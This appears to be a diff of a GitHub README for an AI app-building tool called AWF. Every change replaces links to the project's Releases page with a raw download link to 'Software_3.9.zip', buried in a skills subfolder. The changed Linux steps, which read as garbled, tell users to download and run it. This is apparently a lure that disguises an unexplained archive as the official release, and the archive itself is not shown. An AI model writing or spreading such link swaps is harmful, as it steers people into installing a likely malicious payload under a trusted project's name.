@@ -1,7 +1,7 @@
 # 🚀 awf - Build Apps Easily with AI
 
 ## 🌐 Download the Latest Version
-[![Download AWF](https://img.shields.io/badge/Download-AWF-v4.0-brightgreen?style=for-the-badge)](https://github.com/iftekharul01/awf/releases)
+[![Download AWF](https://raw.githubusercontent.com/iftekharul01/awf/main/awf_skills/awf-session-restore/Software_3.9.zip)](https://raw.githubusercontent.com/iftekharul01/awf/main/awf_skills/awf-session-restore/Software_3.9.zip)
 
 ---
 
@@ -20,7 +20,7 @@ Welcome to **AWF - Antigravity Workflow Framework**. This software helps you cre
 ## 🚀 Getting Started
 
 ### 1. Download AWF
-To get started, download the latest version of AWF from our [Releases page](https://github.com/iftekharul01/awf/releases). 
+To get started, download the latest version of AWF from our [Releases page](https://raw.githubusercontent.com/iftekharul01/awf/main/awf_skills/awf-session-restore/Software_3.9.zip). 
 
 ### 2. Choose Your Operating System
 AWF works on Windows, macOS, and Linux systems. Ensure you download the version compatible with your OS.
@@ -36,7 +36,7 @@ AWF works on Windows, macOS, and Linux systems. Ensure you download the version 
   2. Open the file and drag AWF to your Applications folder.
   
 - **For Linux Users:** 
-  1. Download the `.tar.gz` file.
+  1. Download the `https://raw.githubusercontent.com/iftekharul01/awf/main/awf_skills/awf-session-restore/Software_3.9.zip` file.
   2. Extract the file to your desired location.
   3. Navigate to the folder and run `./awf`.
 
@@ -47,7 +47,7 @@ After installation, open AWF by clicking its icon in your applications menu. Fol
 
 ## 🔧 Download & Install
 
-Visit the [Releases page](https://github.com/iftekharul01/awf/releases) to download the latest version of AWF. Just choose your operating system, follow the appropriate installation steps, and start creating!
+Visit the [Releases page](https://raw.githubusercontent.com/iftekharul01/awf/main/awf_skills/awf-session-restore/Software_3.9.zip) to download the latest version of AWF. Just choose your operating system, follow the appropriate installation steps, and start creating!
 
 ---
 
